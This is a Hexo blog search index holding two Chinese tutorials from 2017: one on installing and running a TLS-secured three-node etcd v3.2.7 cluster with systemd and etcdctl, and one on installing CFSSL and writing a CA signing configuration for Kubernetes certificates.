<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[k8s部署之分布式KV存储Etcd]]></title>
      <url>/2017/09/08/k8s-etcd-deploy-test.html</url>
      <content type="html"><![CDATA[<h4 id="Etcd是什么"><a href="#Etcd是什么" class="headerlink" title="Etcd是什么"></a>Etcd是什么</h4><blockquote>
<p>Etcd是一个分布式、使用Raft算法维护一致性的kv存储系统，与其类似产品有Zookeeper(老牌经典)、Consul等，Etcd相对ZK，更加轻量、易运维。具体三者之间的对比可参考 <a href="https://luyiisme.github.io/2017/04/22/spring-cloud-service-discovery-products/" target="_blank" rel="external">https://luyiisme.github.io/2017/04/22/spring-cloud-service-discovery-products/</a></p>
</blockquote>
<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>和zk、consul等类似，使用场景多用于:</p>
<ul>
<li>服务发现</li>
<li>消息发布与订阅</li>
<li>负载均衡</li>
<li>分布式锁</li>
<li>分布式队列</li>
</ul>
<h4 id="读写性能"><a href="#读写性能" class="headerlink" title="读写性能"></a>读写性能</h4><p>压测数据参考官方：<br><a href="https://coreos.com/etcd/docs/latest/op-guide/performance.html" target="_blank" rel="external">https://coreos.com/etcd/docs/latest/op-guide/performance.html</a></p>
<h4 id="本地集群部署"><a href="#本地集群部署" class="headerlink" title="本地集群部署"></a>本地集群部署</h4><ul>
<li>操作系统:Debian8 x64</li>
<li>Etcd v3.2.7</li>
</ul>
<p>A. 安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/coreos/etcd/releases/download/v3.2.7/etcd-v3.2.7-linux-arm64.tar.gz</div><div class="line">tar xf etcd-v3.2.7-linux-arm64.tar.gz</div><div class="line">cd etcd-v3.2.7-linux-amd64</div><div class="line">cp etc* /usr/local/bin/</div><div class="line"></div><div class="line">etcd: Etcd服务端文件</div><div class="line">etcdctl: 供用户使用的命令客户端</div></pre></td></tr></table></figure></p>
<p>B. 启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">root@a4c8d490:/home/geekwolf# etcd</div><div class="line">2017-09-07 15:42:23.957656 I | etcdmain: etcd Version: 3.2.7</div><div class="line">2017-09-07 15:42:23.957699 I | etcdmain: Git SHA: bb66589</div><div class="line">2017-09-07 15:42:23.957718 I | etcdmain: Go Version: go1.8.3</div><div class="line">2017-09-07 15:42:23.957723 I | etcdmain: Go OS/Arch: linux/amd64</div><div class="line">2017-09-07 15:42:23.957729 I | etcdmain: setting maximum number of CPUs to 8, total number of available CPUs is 8</div><div class="line">2017-09-07 15:42:23.957739 W | etcdmain: no data-dir provided, using default data-dir ./default.etcd</div><div class="line">2017-09-07 15:42:23.957764 N | etcdmain: the server is already initialized as member before, starting as etcd member...</div><div class="line">2017-09-07 15:42:23.957995 I | embed: listening for peers on http://localhost:2380</div><div class="line">2017-09-07 15:42:23.958107 I | embed: listening for client requests on localhost:2379</div><div class="line">2017-09-07 15:42:23.964607 I | etcdserver: name = default</div><div class="line">2017-09-07 15:42:23.964633 I | etcdserver: data dir = default.etcd</div><div class="line">2017-09-07 15:42:23.964652 I | etcdserver: member dir = default.etcd/member</div><div class="line">2017-09-07 15:42:23.964657 I | etcdserver: heartbeat = 100ms</div><div class="line">2017-09-07 15:42:23.964663 I | etcdserver: election = 1000ms</div><div class="line">2017-09-07 15:42:23.964668 I | etcdserver: snapshot count = 100000</div><div class="line">2017-09-07 15:42:23.964680 I | etcdserver: advertise client URLs = http://localhost:2379</div><div class="line">2017-09-07 15:42:23.973007 I | etcdserver: restarting member 8e9e05c52164694d in cluster cdf818194e3a8c32 at commit index 14</div><div class="line">2017-09-07 15:42:23.973041 I | raft: 8e9e05c52164694d became follower at term 2</div><div class="line">2017-09-07 15:42:23.973065 I | raft: newRaft 8e9e05c52164694d [peers: [], term: 2, commit: 14, applied: 0, lastindex: 14, lastterm: 2]</div><div class="line">2017-09-07 15:42:23.984367 W | auth: simple token is not cryptographically signed</div><div class="line">2017-09-07 15:42:23.993237 I | etcdserver: starting server... [version: 3.2.7, cluster version: to_be_decided]</div><div class="line">2017-09-07 15:42:23.993659 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32</div><div class="line">2017-09-07 15:42:23.993754 N | etcdserver/membership: set the initial cluster version to 3.2</div><div class="line">2017-09-07 15:42:23.993796 I | etcdserver/api: enabled capabilities for version 3.2</div><div class="line">2017-09-07 15:42:24.473288 I | raft: 8e9e05c52164694d is starting a new election at term 2</div><div class="line">2017-09-07 15:42:24.473451 I | raft: 8e9e05c52164694d became candidate at term 3</div><div class="line">2017-09-07 15:42:24.473519 I | raft: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 3</div><div class="line">2017-09-07 15:42:24.473568 I | raft: 8e9e05c52164694d became leader at term 3</div><div class="line">2017-09-07 15:42:24.473605 I | raft: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 3</div><div class="line">2017-09-07 15:42:24.478746 I | etcdserver: published &#123;Name:default ClientURLs:[http://localhost:2379]&#125; to cluster cdf818194e3a8c32</div><div class="line">2017-09-07 15:42:24.478824 I | embed: ready to serve client requests</div><div class="line">2017-09-07 15:42:24.479116 N | embed: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged!</div></pre></td></tr></table></figure></p>
<p>由上面的输出可知：</p>
<ul>
<li>etcd服务之间通信端口是2380，暴露给客户端端口为2379</li>
<li>默认将数据存放到当前路径default.etcd/目录下</li>
<li>该节点的名称默认为default</li>
<li>集群和节点都会生成唯一的uuid</li>
<li>启动服务时，会根据raft算法，选举leader</li>
</ul>
<p>C. 测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">查看api版本（默认api版本是v2）</div><div class="line">root@a4c8d490:~/k8s/etcd-v3.2.7-linux-amd64# etcdctl  --version</div><div class="line">etcdctl version: 3.2.7</div><div class="line">API version: 2</div><div class="line"></div><div class="line">使用API V3方法：</div><div class="line">Etcd服务端和客户端添加变量 export ETCDCTL_API=3,重新启动etcd服务即可</div><div class="line">以下操作在api v3版本:</div><div class="line">写入key: etcdctl put foo bar</div><div class="line">读取key: etcdctl get foo</div><div class="line">多key范围读取: etcdctl get foo foo9(会将foo..foo8的key读取,不包括foo9)</div><div class="line">读取过往版本key的值(Etcd键值对的修改都会增加全局修订版本号,--rev为版本号):</div><div class="line"> etcdctl get --rev=4 foo foo9</div><div class="line">删除key: etcdctl del foo</div><div class="line">范围删除(foo-&amp;gt;foo9):etcdctl del foo foo9</div><div class="line">观察key变化:etcdctl watch foo</div><div class="line">观察范围key变化: etcdctl watch foo foo9</div><div class="line">从rev=2版本开始观察key变化: etcdctl watch --rev=2 foo</div><div class="line">压缩版本5之前的修订版本(压缩后5之前的版本不可能访问): etcdctl compact 5</div><div class="line">授予key有效期:</div><div class="line">创建租约: </div><div class="line">$ etcdctl lease grant 10</div><div class="line">lease 694d5e5b63a74f31 granted with TTL(10s)</div><div class="line">附加key foo到租约694d5e5b63a74f31，该租约过期后，会删除附加的所有key</div><div class="line">撤销租约(撤销后，附加改租约的所有key被删除): etcdctl lease revoke 32695410dcc0ca06</div><div class="line">维持租约(执行后，会一直维持该租约): etcdctl lease keep-alive 32695410dcc0ca0</div><div class="line"></div><div class="line">其他参数可参考 etcdctl --help</div><div class="line">通过HTTP操作：</div><div class="line">Etcd v2: https://coreos.com/etcd/docs/latest/v2/api.html</div><div class="line">Etcd v3: https://coreos.com/etcd/docs/latest/dev-guide/api_grpc_gateway.html</div></pre></td></tr></table></figure></p>
<h4 id="多节点集群部署"><a href="#多节点集群部署" class="headerlink" title="多节点集群部署"></a>多节点集群部署</h4><h5 id="静态模式部署"><a href="#静态模式部署" class="headerlink" title="静态模式部署"></a>静态模式部署</h5><h6 id="环境说明-三节点集群"><a href="#环境说明-三节点集群" class="headerlink" title="环境说明(三节点集群)"></a>环境说明(三节点集群)</h6><table>
<thead>
<tr>
<th style="text-align:left">节点</th>
<th style="text-align:left">地址</th>
<th style="text-align:left">主机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">etcd1</td>
<td style="text-align:left">192.168.234.133</td>
<td style="text-align:left">etcd1.simlinux.com</td>
</tr>
<tr>
<td style="text-align:left">etcd2</td>
<td style="text-align:left">192.168.234.133</td>
<td style="text-align:left">etcd2.simlinux.com</td>
</tr>
<tr>
<td style="text-align:left">etcd3</td>
<td style="text-align:left">192.168.234.133</td>
<td style="text-align:left">etcd3.simlinux.com</td>
</tr>
</tbody>
</table>
<h6 id="初始化环境"><a href="#初始化环境" class="headerlink" title="初始化环境"></a>初始化环境</h6><p>三个节点分别设置主机名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hostnamectl --static  set-hostname etcd1.simlinux.com</div><div class="line">hostnamectl --static  set-hostname etcd2.simlinux.com</div><div class="line">hostnamectl --static  set-hostname etcd3.simlinux.com</div></pre></td></tr></table></figure></p>
<p>三个节点hosts文件添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/hosts</div><div class="line">192.168.234.133 etcd1.simlinux.com </div><div class="line">192.168.234.133 etcd2.simlinux.com </div><div class="line">192.168.234.133 etcd3.simlinux.com</div></pre></td></tr></table></figure></p>
<p><strong>生成etcd证书(用于etcd间、客户端与etcd通信)</strong></p>
<blockquote>
<p>由上篇<a href="http://www.simlinux.com/archives/1953.html">k8s部署之使用CFSSL创建证书</a>的CA来生成</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">cat  etcd.json </div><div class="line">&#123;</div><div class="line">    &quot;CN&quot;: &quot;etcd&quot;,</div><div class="line">    &quot;hosts&quot;: [</div><div class="line">        &quot;127.0.0.1&quot;,</div><div class="line">        &quot;192.168.234.133&quot;,</div><div class="line">        &quot;192.168.234.134&quot;,</div><div class="line">        &quot;192.168.234.135&quot;</div><div class="line">    ],</div><div class="line">    &quot;key&quot;: &#123;</div><div class="line">        &quot;algo&quot;: &quot;ecdsa&quot;,</div><div class="line">        &quot;size&quot;: 256</div><div class="line">    &#125;,</div><div class="line">    &quot;names&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;C&quot;: &quot;CN&quot;,</div><div class="line">            &quot;L&quot;: &quot;ShangHai&quot;,</div><div class="line">            &quot;ST&quot;: &quot;ShangHai&quot;,</div><div class="line">            &quot;O&quot;: &quot;K8s&quot;,</div><div class="line">            &quot;OU&quot;: &quot;System&quot;</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=peer etcd.json | cfssljson -bare etcd</div><div class="line">将CA和etcd证书拷贝到etcd所有节点:</div><div class="line">cp ca.pem  etcd-key.pem  etcd.pem /etc/etcd/ssl/</div></pre></td></tr></table></figure>
<h6 id="安装etcd节点-所有节点"><a href="#安装etcd节点-所有节点" class="headerlink" title="安装etcd节点(所有节点)"></a>安装etcd节点(所有节点)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/coreos/etcd/releases/download/v3.2.7/etcd-v3.2.7-linux-amd64.tar.gz</div><div class="line">tar xf etcd-v3.2.7-linux-amd64.tar.gz</div><div class="line">cd etcd-v3.2.7-linux-amd64</div><div class="line">chmod +x etcd*</div><div class="line">cp etcd* /bin</div></pre></td></tr></table></figure>
<h6 id="etcd配置"><a href="#etcd配置" class="headerlink" title="etcd配置"></a>etcd配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">服务管理(所有节点相同):</div><div class="line">vim /usr/lib/systemd/system/etcd.service</div><div class="line">[Unit]</div><div class="line">Description=Etcd Server</div><div class="line">After=network.target</div><div class="line">After=network-online.target</div><div class="line">Wants=network-online.target</div><div class="line">Documentation=https://github.com/coreos</div><div class="line">[Service]</div><div class="line">Type=notify</div><div class="line">WorkingDirectory=/data/k8s/etcd/</div><div class="line">EnvironmentFile=/etc/etcd/etcd.conf</div><div class="line">ExecStart=/bin/etcd </div><div class="line">  --name=$&#123;NAME&#125; </div><div class="line">  --cert-file=/etc/etcd/ssl/etcd.pem </div><div class="line">  --key-file=/etc/etcd/ssl/etcd-key.pem </div><div class="line">  --peer-cert-file=/etc/etcd/ssl/etcd.pem </div><div class="line">  --peer-key-file=/etc/etcd/ssl/etcd-key.pem </div><div class="line">  --trusted-ca-file=/etc/etcd/ssl/ca.pem </div><div class="line">  --peer-trusted-ca-file=/etc/etcd/ssl/ca.pem </div><div class="line">  --initial-advertise-peer-urls=$&#123;INITIAL_ADVERTISE_PEER_URLS&#125; </div><div class="line">  --listen-peer-urls=$&#123;LISTEN_PEER_URLS&#125; </div><div class="line">  --listen-client-urls=$&#123;LISTEN_CLIENT_URLS&#125; </div><div class="line">  --advertise-client-urls=$&#123;ADVERTISE_CLIENT_URLS&#125; </div><div class="line">  --initial-cluster-token=$&#123;INITIAL_CLUSTER_TOKEN&#125; </div><div class="line">  --initial-cluster=$&#123;INITIAL_CLUSTER&#125; </div><div class="line">  --initial-cluster-state=new </div><div class="line">  --data-dir=$&#123;DATA_DIR&#125;</div><div class="line">Restart=on-failure</div><div class="line">RestartSec=5</div><div class="line">LimitNOFILE=65536</div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div></pre></td></tr></table></figure>
<p>配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">vim /etc/etcd/etcd.conf</div><div class="line">#节点名称</div><div class="line">NAME=&quot;etcd1&quot;</div><div class="line">#etcd数据存放目录</div><div class="line">DATA_DIR=&quot;/data/k8s/etcd&quot;</div><div class="line">#etcd节点间通信监听地址</div><div class="line">LISTEN_PEER_URLS=&quot;https://192.168.234.133:2380&quot;</div><div class="line">#对外提供服务的地址</div><div class="line">LISTEN_CLIENT_URLS=&quot;https://192.168.234.133:2379,https://127.0.0.1:2379&quot;</div><div class="line">#通知其他etcd节点本实例地址</div><div class="line">INITIAL_ADVERTISE_PEER_URLS=&quot;https://192.168.234.133:2380&quot;</div><div class="line">#初始化集群内节点地址</div><div class="line">INITIAL_CLUSTER=&quot;etcd1=https://192.168.234.133:2380,etcd2=https://192.168.234.134:2380,etcd3=https://192.168.234.135:2380&quot;</div><div class="line">#初始化状态.new表示新建,已经存在的集群使用existing</div><div class="line">INITIAL_CLUSTER_STATE=&quot;new&quot;</div><div class="line">#创建集群的token,每个集群唯一</div><div class="line">INITIAL_CLUSTER_TOKEN=&quot;k8s-etcd-cluster&quot;</div><div class="line">#告知其他集群本节点客户端监听地址</div><div class="line">ADVERTISE_CLIENT_URLS=&quot;https://192.168.234.133:2379&quot;</div><div class="line">ETCDCTL_API=3</div><div class="line">其中NAME/LISTEN_PEER_URLS/LISTEN_CLIENT_URLS/INITIAL_ADVERTISE_PEER_URLS/ADVERTISE_CLIENT_URLS替换成相应节点名称和地址</div></pre></td></tr></table></figure></p>
<h6 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">systemctl start etcd.service</div><div class="line">systemctl stop etcd.service</div><div class="line">systemctl status etcd.service(查看服务状态及日志)</div></pre></td></tr></table></figure>
<h6 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">[root@etcd1 ~]# export etcd1=192.168.234.133</div><div class="line">[root@etcd1 ~]# export etcd2=192.168.234.134</div><div class="line">[root@etcd1 ~]# export etcd3=192.168.234.135</div><div class="line">[root@etcd1 ~]# export ENDPOINTS=$etcd1:2379,$etcd2:2379,$etcd3:2379</div><div class="line">查看集群成员:</div><div class="line">[root@etcd1 etcd]#  etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member list</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">|        ID        | STATUS  | NAME  |          PEER ADDRS          |         CLIENT ADDRS         |</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">| 1a4a83ef243ff1c9 | started | etcd2 | https://192.168.234.134:2380 | https://192.168.234.134:2379 |</div><div class="line">| 68243ef8797bd1ce | started | etcd1 | https://192.168.234.133:2380 | https://192.168.234.133:2379 |</div><div class="line">| fa30209a63d949b0 | started | etcd3 | https://192.168.234.135:2380 | https://192.168.234.135:2379 |</div><div class="line">+------------------+---------+-------+------------------------------+------------------------------+</div><div class="line">查看集群状态:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem endpoint status</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">|       ENDPOINT       |        ID        | VERSION | DB SIZE | IS LEADER | RAFT TERM | RAFT INDEX |</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">| 192.168.234.133:2379 | 68243ef8797bd1ce |   3.2.7 |   25 kB |     false |        10 |          9 |</div><div class="line">| 192.168.234.134:2379 | 1a4a83ef243ff1c9 |   3.2.7 |   25 kB |     false |        10 |          9 |</div><div class="line">| 192.168.234.135:2379 | fa30209a63d949b0 |   3.2.7 |   25 kB |      true |        10 |          9 |</div><div class="line">+----------------------+------------------+---------+---------+-----------+-----------+------------+</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem endpoint health</div><div class="line">192.168.234.135:2379 is healthy: successfully committed proposal: took = 1.374345ms</div><div class="line">192.168.234.134:2379 is healthy: successfully committed proposal: took = 2.217525ms</div><div class="line">192.168.234.133:2379 is healthy: successfully committed proposal: took = 1.996245ms</div><div class="line">保存快照:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot save my.db</div><div class="line">Snapshot saved at my.db</div><div class="line">查看快照状态:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot status my.db</div><div class="line">+----------+----------+------------+------------+</div><div class="line">|   HASH   | REVISION | TOTAL KEYS | TOTAL SIZE |</div><div class="line">+----------+----------+------------+------------+</div><div class="line">| 9a496339 |        3 |          8 |      25 kB |</div><div class="line">+----------+----------+------------+------------+</div><div class="line">恢复数据(要先删除原来数据目录,所有节点操作)：</div><div class="line">[root@etcd1 ~]# etcdctl  --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem snapshot restore my.db  --data-dir=/data/k8s/etcd/</div><div class="line">2017-09-09 02:28:52.439616 I | etcdserver/membership: added member 8e9e05c52164694d [http://localhost:2380] to cluster cdf818194e3a8c32</div><div class="line">删除节点:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member remove 68243ef8797bd1ce</div><div class="line">更新节点:</div><div class="line">[root@etcd1 ~]# etcdctl --write-out=table --endpoints=$ENDPOINTS --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem member update 68243ef8797bd1ce https://192.168.234.133:1111(INITIAL_ADVERTISE_PEER_URLS)</div><div class="line">添加节点(删除etcd3，添加etcd4):</div><div class="line">export etcd4=192.168.234.136</div><div class="line">[root@etcd1 ~]#  etcdctl --endpoints=$&#123;etcd1&#125;:2379,$&#123;etcd2&#125;:2379 --cacert=/etc/etcd/ssl/ca.pem  --cert=/etc/etcd/ssl/etcd.pem --key=/etc/etcd/ssl/etcd-key.pem  member add etcd4 --peer-urls=http://192.168.234.136:2380</div></pre></td></tr></table></figure>
<blockquote>
<p>Etcd:从应用场景到实现原理的全方位解读 <a href="http://www.infoq.com/cn/articles/etcd-interpretation-application-scenario-implement-principle" target="_blank" rel="external">http://www.infoq.com/cn/articles/etcd-interpretation-application-scenario-implement-principle</a><br>  Eetcd集群管理 <a href="https://coreos.com/etcd/docs/latest/demo.html" target="_blank" rel="external">https://coreos.com/etcd/docs/latest/demo.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
            <tag> etcd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[k8s部署之使用CFSSL创建证书]]></title>
      <url>/2017/09/07/k8s-cfssl-install-cert.html</url>
      <content type="html"><![CDATA[<h4 id="安装CFSSL"><a href="#安装CFSSL" class="headerlink" title="安装CFSSL"></a>安装CFSSL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl -s -L -o /bin/cfssl https://pkg.cfssl.org/R1.2/cfssl_linux-amd64</div><div class="line">curl -s -L -o /bin/cfssljson https://pkg.cfssl.org/R1.2/cfssljson_linux-amd64</div><div class="line">curl -s -L -o /bin/cfssl-certinfo https://pkg.cfssl.org/R1.2/cfssl-certinfo_linux-amd64</div><div class="line">chmod +x /bin/cfssl*</div></pre></td></tr></table></figure>
<h4 id="容器相关证书类型"><a href="#容器相关证书类型" class="headerlink" title="容器相关证书类型"></a>容器相关证书类型</h4><blockquote>
<p>client certificate： 用于服务端认证客户端,例如etcdctl、etcd proxy、fleetctl、docker客户端<br>server certificate:  服务端使用，客户端以此验证服务端身份,例如docker服务端、kube-apiserver<br>peer certificate: 双向证书，用于etcd集群成员间通信</p>
</blockquote>
<h4 id="创建CA证书"><a href="#创建CA证书" class="headerlink" title="创建CA证书"></a>创建CA证书</h4><h5 id="生成默认CA配置"><a href="#生成默认CA配置" class="headerlink" title="生成默认CA配置"></a>生成默认CA配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /opt/ssl</div><div class="line">cd /opt/ssl</div><div class="line">cfssl print-defaults config &gt; ca-config.json</div><div class="line">cfssl print-defaults csr &gt; ca-csr.json</div></pre></td></tr></table></figure>
<p><strong>修改ca-config.json,分别配置针对三种不同证书类型的profile,其中有效期43800h为5年</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">    &#123;</div><div class="line">    &quot;signing&quot;: &#123;</div><div class="line">        &quot;default&quot;: &#123;</div><div class="line">            &quot;expiry&quot;: &quot;43800h&quot;</div><div class="line">        &#125;,</div><div class="line">        &quot;profiles&quot;: &#123;</div><div class="line">            &quot;server&quot;: &#123;</div><div class="line">                &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">                &quot;usages&quot;: [</div><div class="line">                    &quot;signing&quot;,</div><div class="line">                    &quot;key encipherment&quot;,</div><div class="line">                    &quot;server auth&quot;</div><div class="line">                ]</div><div class="line">            &#125;,</div><div class="line">            &quot;client&quot;: &#123;</div><div class="line">                &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">                &quot;usages&quot;: [</div><div class="line">                    &quot;signing&quot;,</div><div class="line">                    &quot;key encipherment&quot;,</div><div class="line">                    &quot;client auth&quot;</div><div class="line">                ]</div><div class="line">            &#125;,</div><div class="line">            &quot;peer&quot;: &#123;</div><div class="line">                &quot;expiry&quot;: &quot;43800h&quot;,</div><div class="line">                &quot;usages&quot;: [</div><div class="line">                    &quot;signing&quot;,</div><div class="line">                    &quot;key encipherment&quot;,</div><div class="line">                    &quot;server auth&quot;,</div><div class="line">                    &quot;client auth&quot;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
